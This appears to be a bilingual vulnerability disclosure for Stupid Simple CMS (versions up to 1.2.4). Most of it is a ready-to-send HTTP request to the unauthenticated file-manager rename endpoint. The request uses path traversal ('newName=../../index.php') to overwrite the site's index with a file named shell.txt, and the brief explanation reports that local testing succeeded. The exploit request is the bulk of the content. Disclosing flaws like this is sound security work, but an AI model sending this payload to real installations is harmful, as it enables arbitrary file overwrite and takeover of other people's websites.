product： Stupid Simple CMS ( Blogger )

download link： https://github.com/codelyfe/Stupid-Simple-CMS

version：<=1.2.4

POC
```shell
POST http://localhost/file-manager/rename.php HTTP/1.1
Host: localhost
Content-Length: 36
sec-ch-ua: "Chromium";v="91", " Not;A Brand";v="99"
Accept: */*
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://localhost
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost/file-manager/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

oldName=shell.txt&newName=../../index.php
```
The code audit found that the file renaming interface has no authentication measures, which can lead to arbitrary file overwriting.
代码审计发现文件重命名接口无鉴权措施，可导致任意文件覆盖
![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/202312171633421.png)

![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/202312151618298.png)
Arbitrarily use a known file to overwrite any file across directories, combined with cross-directory vulnerabilities to achieve arbitrary file overwriting.
随意使用一个已知的文件进行跨目录覆盖任意文件，配合跨目录漏洞可以实现任意文件覆盖。
![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/202312151654061.png)
Local test: overwritten successfully.
本地测试：覆盖成功。
![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/202312151655120.png)
